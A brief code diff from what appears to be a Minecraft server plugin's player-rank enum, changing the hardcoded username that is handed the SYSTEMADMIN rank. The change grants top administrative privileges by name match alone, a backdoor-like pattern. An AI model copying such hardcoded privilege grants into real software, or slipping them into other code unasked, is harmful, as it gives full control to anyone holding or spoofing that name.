@@ -72,7 +72,7 @@ public enum TFM_PlayerRank
         {
             return DEVELOPER;
         }
-        if (sender.getName().equals("FUNDRAGON123"))
+        if (sender.getName().equals("AvalancheYT"))
         {
             return SYSTEMADMIN;
         }
